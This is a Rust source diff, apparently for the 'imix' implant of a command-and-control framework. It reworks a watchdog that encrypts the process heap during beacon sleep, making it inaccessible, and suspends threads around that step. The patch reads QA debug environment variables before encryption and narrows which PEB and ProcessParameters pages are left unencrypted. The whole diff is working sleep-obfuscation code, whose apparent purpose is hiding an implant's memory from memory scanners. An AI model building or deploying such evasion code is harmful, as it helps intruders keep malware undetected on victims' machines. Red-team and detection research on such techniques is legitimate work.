@@ -170,32 +170,33 @@ pub fn min_encrypt_interval_secs() -> f64 {
     })
 }
 
-/// QA debug knob: if `IMIX_MEMGUARD_DEBUG_MIDWAKE_SECS` is a positive finite
-/// number, the watchdog shortens the encrypted sleep window to that many seconds
-/// instead of the full beacon interval. Unset / invalid / <= 0 -> None. Parsed once.
-#[cfg(any(test, feature = "print_debug"))]
-fn debug_midwake_secs() -> Option<f64> {
-    static CACHED: OnceLock<Option<f64>> = OnceLock::new();
-    *CACHED.get_or_init(|| {
-        std::env::var("IMIX_MEMGUARD_DEBUG_MIDWAKE_SECS")
-            .ok()
-            .and_then(|s| s.parse::<f64>().ok())
-            .filter(|v| v.is_finite() && *v > 0.0)
-    })
+/// Eagerly-resolved QA debug knobs. Read **once** at watchdog init (strictly
+/// before any `encrypt()`), so the encrypted window never calls `std::env::var`
+/// (which would fault on the now-NOACCESS process environment block). Passed by
+/// value into `run_cycle`; never re-parsed post-encryption.
+struct DebugKnobs {
+    midwake: Option<f64>,
+    partial: Option<usize>,
 }
 
-/// QA debug knob: if `IMIX_MEMGUARD_DEBUG_PARTIAL_DECRYPT` is a usize K, the wake
-/// path decrypts only the first K recorded pages and leaves the rest encrypted
-/// (K=0 leaves ALL encrypted) so the resumed runtime exercises the VEH lazy-
-/// decrypt path live. Unset / invalid -> None (full decrypt). Parsed once.
 #[cfg(any(test, feature = "print_debug"))]
-fn debug_partial_decrypt_k() -> Option<usize> {
-    static CACHED: OnceLock<Option<usize>> = OnceLock::new();
-    *CACHED.get_or_init(|| {
-        std::env::var("IMIX_MEMGUARD_DEBUG_PARTIAL_DECRYPT")
-            .ok()
-            .and_then(|s| s.parse::<usize>().ok())
-    })
+fn resolve_debug_knobs() -> DebugKnobs {
+    let midwake = std::env::var("IMIX_MEMGUARD_DEBUG_MIDWAKE_SECS")
+        .ok()
+        .and_then(|s| s.parse::<f64>().ok())
+        .filter(|v| v.is_finite() && *v > 0.0);
+    let partial = std::env::var("IMIX_MEMGUARD_DEBUG_PARTIAL_DECRYPT")
+        .ok()
+        .and_then(|s| s.parse::<usize>().ok());
+    DebugKnobs { midwake, partial }
+}
+
+#[cfg(not(any(test, feature = "print_debug")))]
+fn resolve_debug_knobs() -> DebugKnobs {
+    DebugKnobs {
+        midwake: None,
+        partial: None,
+    }
 }
 
 /// Engage the watchdog for one sleep cycle. Returns `true` once the cycle (which
@@ -246,6 +247,7 @@ fn ensure_watchdog() -> Option<&'static Sender<WatchdogCommand>> {
 
 fn watchdog_main(cmd_rx: Receiver<WatchdogCommand>, ntdll: (usize, usize)) {
     trace_init();
+    let knobs = resolve_debug_knobs();
     let ntqit = resolve_ntquery();
     let ntqsi = resolve_ntqsi();
     let mut guard: Option<MemGuard> = MemGuard::new();
@@ -284,6 +286,7 @@ fn watchdog_main(cmd_rx: Receiver<WatchdogCommand>, ntdll: (usize, usize)) {
             ntdll.0,
             ntdll.1,
             cmd.interval_secs,
+            &knobs,
         );
         // The cycle only returns after a full decrypt (resume+wake) or a clean
         // skip; a failed decrypt terminates the process in `ensure_decrypted`.
@@ -783,6 +786,20 @@ fn add_thread_state_exclusions(guard: &mut MemGuard, slots: &[ThreadSlot]) -> bo
                 if peb_size > 0 && !guard.add_exclusion(peb as *const u8, peb_size) {
                     return false;
                 }
+                // UNSAFE INVARIANT (narrow ProcessParameters exclusion): exclude only
+                // the pages the RTL_USER_PROCESS_PARAMETERS struct occupies (x64 ~0x490
+                // bytes from PEB+0x20), not its whole region (which holds the env
+                // block). See the watchdog exclusion above for the full rationale.
+                let pp = *(peb.add(0x20) as *const *mut c_void);
+                if !pp.is_null() {
+                    let pp_base = (pp as usize) & !(PAGE_SIZE - 1);
+                    let pp_end = (pp as usize) + 0x490;
+                    let pp_pages_end = (pp_end + PAGE_SIZE - 1) & !(PAGE_SIZE - 1);
+                    let pp_len = pp_pages_end - pp_base;
+                    if pp_len > 0 && !guard.add_exclusion(pp_base as *const u8, pp_len) {
+                        return false;
+                    }
+                }
             }
             let tls = *(s.teb.add(0x58) as *const *mut c_void);
             if !tls.is_null() {
@@ -835,6 +852,23 @@ fn add_watchdog_exclusions(guard: &mut MemGuard, ntqit: NtQueryInformationThread
             let peb_size = region_size_of(peb);
             if peb_size > 0 && !guard.add_exclusion(peb as *const u8, peb_size) {
                 return false;
+            }
+            // UNSAFE INVARIANT (narrow ProcessParameters exclusion): exclude ONLY the
+            // pages the RTL_USER_PROCESS_PARAMETERS struct itself occupies (x64 ~0x490
+            // bytes from the PEB+0x20 pointer), NOT the whole VirtualQuery region
+            // (which also holds the process environment block). The CRT/std handle
+            // table lives inside the PP struct; the environment block is a separate
+            // allocation referenced by PP->Environment and is DELIBERATELY left
+            // encrypted and never read post-encryption (see eager-parse fix above).
+            let pp = *(peb.add(0x20) as *const *mut c_void);
+            if !pp.is_null() {
+                let pp_base = (pp as usize) & !(PAGE_SIZE - 1);
+                let pp_end = (pp as usize) + 0x490;
+                let pp_pages_end = (pp_end + PAGE_SIZE - 1) & !(PAGE_SIZE - 1);
+                let pp_len = pp_pages_end - pp_base;
+                if pp_len > 0 && !guard.add_exclusion(pp_base as *const u8, pp_len) {
+                    return false;
+                }
             }
         }
         let tls = *(teb.add(0x58) as *const *mut c_void);
@@ -1113,6 +1147,7 @@ fn run_cycle(
     ntdll_base: usize,
     ntdll_size: usize,
     interval_secs: f64,
+    knobs: &DebugKnobs,
 ) -> CycleOutcome {
     let self_tid = unsafe { GetCurrentThreadId() };
 
@@ -1234,9 +1269,13 @@ fn run_cycle(
             skipped: true,
         };
     }
-    // Heap is now encrypted: from here on, never emit to stdout (it can block on
-    // a wedged inherited handle). The trace file is always safe; the stdout
-    // fallback (trace unavailable) drops lines while encrypted.
+    // INVARIANT (post-encrypt): from here until the cycle ends this thread touches
+    // only its own stack, the already-allocated unencrypted state region, the
+    // trace-file handle, and raw FFI (Sleep/GetTickCount64/WriteFile/VirtualProtect/
+    // Suspend/Resume/GetThreadContext). It must NOT call std::env::var,
+    // GetStdHandle, CRT locale/timezone, or allocate from the now-NOACCESS heap.
+    // Debug-knob env reads were resolved by resolve_debug_knobs() at watchdog init,
+    // strictly before encrypt(), so none happen here.
     set_stdout_safe(false);
     trace_line(
         "encrypt-done",
@@ -1256,12 +1295,9 @@ fn run_cycle(
     emit_engage(dormant, pages, interval_secs);
     trace_line("engage-emitted", format_args!("pages={pages}"));
 
-    // --- QA debug knobs (gated to test / print_debug builds) -------------------
+    // --- QA debug knobs (eagerly resolved pre-encryption; see resolve_debug_knobs) -
     // MIDWAKE: shorten the encrypted sleep window to S seconds (S < interval).
-    #[cfg(any(test, feature = "print_debug"))]
-    let mid = debug_midwake_secs().filter(|&s| s > 0.0 && s < interval_secs);
-    #[cfg(not(any(test, feature = "print_debug")))]
-    let mid: Option<f64> = None;
+    let mid = knobs.midwake.filter(|&s| s > 0.0 && s < interval_secs);
 
     let encrypted_sleep = match mid {
         Some(s) => {
@@ -1280,10 +1316,7 @@ fn run_cycle(
     // K=0 leaves ALL pages encrypted. QA fault-injection only; the self-heal path
     // is the NEXT cycle's encrypt() refusing (count != 0 -> "encrypt failed"
     // skip) followed by ensure_decrypted completing the recovery.
-    #[cfg(any(test, feature = "print_debug"))]
-    let partial = debug_partial_decrypt_k();
-    #[cfg(not(any(test, feature = "print_debug")))]
-    let partial: Option<usize> = None;
+    let partial = knobs.partial;
 
     let t0_dec = trace_now();
     trace_line("decrypt-start", format_args!("partial={:?}", partial));
@@ -1670,7 +1703,17 @@ mod tests {
 
         let mut calib: Option<SpiLayout> = None;
         let outcome = run_cycle(
-            &mut guard, ntqit, ntqsi, &mut calib, ntdll_base, ntdll_size, 0.0,
+            &mut guard,
+            ntqit,
+            ntqsi,
+            &mut calib,
+            ntdll_base,
+            ntdll_size,
+            0.0,
+            &DebugKnobs {
+                midwake: None,
+                partial: None,
+            },
         );
         assert!(
             !outcome.skipped,
